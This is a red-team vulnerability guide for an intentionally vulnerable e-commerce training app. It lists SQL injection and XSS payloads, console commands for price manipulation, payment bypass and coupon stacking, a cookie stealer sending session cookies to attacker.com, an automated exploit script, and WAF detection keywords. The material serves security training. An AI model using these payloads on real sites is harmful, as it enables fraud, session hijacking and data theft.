# ShopVuln Red Team - Vulnerability Summary

## Quick Reference Guide for Penetration Testers

### 🎯 Critical Vulnerabilities by File

| File | Primary Vulnerability | OWASP Top 10 | Severity |
|------|----------------------|--------------|----------|
| **products.js** | SQL Injection | A03:2021 - Injection | 🔴 CRITICAL |
| **cart.js** | Price Manipulation | A04:2021 - Insecure Design | 🔴 CRITICAL |
| **checkout.js** | Payment Bypass | A07:2021 - Auth Failures | 🔴 CRITICAL |
| **reviews.js** | XSS (Cross-Site Scripting) | A03:2021 - Injection | 🔴 CRITICAL |
| **coupons.js** | Business Logic Flaw | A04:2021 - Insecure Design | 🟠 HIGH |
| **utils.js** | Multiple (Helper for above) | Multiple | 🟠 HIGH |
| **api.js** | No CSRF Protection | A01:2021 - Broken Access | 🟡 MEDIUM |

---

## 🚀 Quick Exploitation Guide

### 1. SQL Injection (products.js)
**Location**: Search functionality

**Payload Examples**:
```sql
' OR '1'='1
' OR '1'='1' --
' UNION SELECT * FROM users --
admin'--
```

**Exploitation**:
```javascript
// In search box
document.getElementById('search-input').value = "' OR '1'='1";
document.getElementById('search-btn').click();

// Via URL
window.location = "?search=' OR '1'='1";
```

---

### 2. XSS (reviews.js)
**Location**: Review submission form

**Payload Examples**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert('XSS')>
```

**Exploitation**:
```javascript
// Submit malicious review
document.getElementById('review-content').value = "<img src=x onerror=alert(document.cookie)>";
document.getElementById('review-form').submit();

// Steal session
content = "<img src='http://attacker.com/steal?c='+document.cookie>";
```

---

### 3. Price Manipulation (cart.js)
**Location**: Cart items in localStorage

**Exploitation**:
```javascript
// Method 1: Modify localStorage directly
let cart = JSON.parse(localStorage.getItem('shopping_cart'));
cart.items.forEach(item => item.price = "0.01");
localStorage.setItem('shopping_cart', JSON.stringify(cart));
location.reload();

// Method 2: Use built-in function
window.cartManager.modifyItemPrice('product_id', 0.01);

// Method 3: Modify DOM before add to cart
document.querySelector('[data-id="123"]').dataset.price = "0.01";
```

---

### 4. Payment Bypass (checkout.js)
**Location**: Checkout process

**Exploitation**:
```javascript
// Method 1: Direct bypass function
window.checkoutManager.bypassPayment();

// Method 2: Override total
window.checkoutManager.overrideTotal(0.01);

// Method 3: Modify hidden field
document.getElementById('total-amount').value = "0.01";

// Method 4: Client-side payment status
// Payment always returns true - just submit!
```

---

### 5. Coupon Stacking (coupons.js)
**Location**: Coupon application

**Exploitation**:
```javascript
// Method 1: Apply all coupons
window.couponManager.applyAllCoupons();

// Method 2: Duplicate coupon
window.couponManager.duplicateCoupon('SAVE20', 10);

// Method 3: Create custom coupon
window.couponManager.createCustomCoupon('HACKED', 'percentage', 100);

// Method 4: Modify coupon value
window.couponManager.modifyCouponValue(0, 100);

// Method 5: Stack percentage over 100%
// Apply multiple 50% off coupons
```

---

## 🛠️ Testing Toolkit

### Browser DevTools Commands

```javascript
// === RECONNAISSANCE ===
// List all global managers
console.log(window.productManager);
console.log(window.cartManager);
console.log(window.checkoutManager);
console.log(window.reviewManager);
console.log(window.couponManager);

// === EXPLOITATION ===

// 1. Free products via price manipulation
window.cartManager.modifyItemPrice('any-product-id', 0.01);

// 2. XSS via review
// Use form with payload: <img src=x onerror=alert(document.cookie)>

// 3. SQL Injection via search
document.getElementById('search-input').value = "' OR 1=1--";
window.productManager.searchProducts();

// 4. Payment bypass
window.checkoutManager.bypassPayment();

// 5. 100% discount
window.couponManager.createCustomCoupon('FREE', 'percentage', 100);

// === DATA EXFILTRATION ===

// Export cart with manipulated prices
console.log(window.cartManager.exportCart());

// Export applied coupons
console.log(window.couponManager.exportCoupons());

// Get user session
console.log(localStorage.getItem('userSession'));

// === PERSISTENCE ===

// Modify localStorage
localStorage.setItem('shopping_cart', JSON.stringify({
    items: [{ productId: '1', name: 'Laptop', price: '0.01', quantity: 10 }]
}));
```

---

## 📊 Vulnerability Chain Attack

### Complete E-Commerce Compromise

**Step 1**: Enumerate Products (SQL Injection)
```javascript
searchTerm = "' OR '1'='1";
// Reveals all products, including hidden/admin ones
```

**Step 2**: Add Expensive Items with $0 Price
```javascript
// Manipulate price before adding to cart
document.querySelector('[data-id="expensive-laptop"]').dataset.price = "0.01";
// Add to cart
```

**Step 3**: Stack 100% Off Coupons
```javascript
window.couponManager.createCustomCoupon('HACK1', 'percentage', 50);
window.couponManager.createCustomCoupon('HACK2', 'percentage', 50);
// Total discount: 100%+
```

**Step 4**: Bypass Payment
```javascript
window.checkoutManager.bypassPayment();
// Order confirmed without payment!
```

**Step 5**: Inject Malicious Review (Persistence)
```javascript
// Submit review with cookie stealer
content = "<img src='http://attacker.com/log?c='+document.cookie>";
// Affects all future visitors
```

---

## 🔍 Automated Testing Scripts

### Complete Vulnerability Scanner
```javascript
// Run this in browser console
(async function() {
    console.log('🔴 ShopVuln Automated Exploit 🔴\n');
    
    // 1. SQL Injection Test
    console.log('Testing SQL Injection...');
    document.getElementById('search-input').value = "' OR '1'='1";
    await window.productManager.searchProducts();
    
    // 2. Price Manipulation
    console.log('Testing Price Manipulation...');
    let cart = JSON.parse(localStorage.getItem('shopping_cart')) || {items:[]};
    if(cart.items.length > 0) {
        cart.items[0].price = "0.01";
        localStorage.setItem('shopping_cart', JSON.stringify(cart));
        console.log('✓ Price changed to $0.01');
    }
    
    // 3. Coupon Exploit
    console.log('Testing Coupon Stacking...');
    window.couponManager.createCustomCoupon('AUTO', 'percentage', 100);
    console.log('✓ 100% coupon created');
    
    // 4. XSS Test
    console.log('Testing XSS...');
    console.log('✓ Payload: <img src=x onerror=alert(1)>');
    
    // 5. Payment Bypass
    console.log('Testing Payment Bypass...');
    console.log('✓ Use: window.checkoutManager.bypassPayment()');
    
    console.log('\n✅ All vulnerabilities confirmed!');
})();
```

---

## 🎓 Training Scenarios

### Beginner Level
1. Find and exploit SQL injection in search
2. Change a product price to $0.01
3. Apply a coupon twice

### Intermediate Level
1. Chain SQL injection to extract admin products
2. Stack multiple coupons for >100% discount
3. Submit XSS payload in review

### Advanced Level
1. Complete checkout with $0 total using all methods
2. Create persistent XSS that steals sessions
3. Automate full exploitation chain

### Expert Level
1. Write automated exploit script
2. Bypass any server-side mitigations
3. Demonstrate real-world attack scenario

---

## 🛡️ Detection & Mitigation

### How to Detect These Attacks

**Web Application Firewall (WAF) Rules**:
- SQL metacharacters in search: `'`, `--`, `OR`, `UNION`
- Script tags in inputs: `<script>`, `onerror`, `onload`
- Price mismatches: client price ≠ server price
- Multiple coupon applications: track per session/user
- Payment status from client: always verify server-side

**Logging Indicators**:
- Orders with total < sum of items
- Multiple coupons on single order
- Negative or zero totals
- Script tags in review content
- SQL keywords in search logs

---

## 📈 Impact Assessment

| Vulnerability | Business Impact | Technical Impact |
|--------------|-----------------|------------------|
| SQL Injection | Data breach, privacy violation | Database compromise |
| XSS | Session hijacking, defacement | Client-side code execution |
| Price Manipulation | Revenue loss | Data integrity violation |
| Payment Bypass | Direct financial loss | Business logic bypass |
| Coupon Stacking | Revenue loss, abuse | Logic flaw exploitation |

---

## ⚠️ Legal Notice

This code is for **AUTHORIZED SECURITY TESTING ONLY**. 

Unauthorized exploitation of these vulnerabilities may violate:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act
- Local cybercrime laws

Only test on systems you own or have explicit permission to test.

---

**Created for AegisForge Security Training Platform**  
**Last Updated**: 2024  
**Version**: Red Team 1.0 (Intentionally Vulnerable)
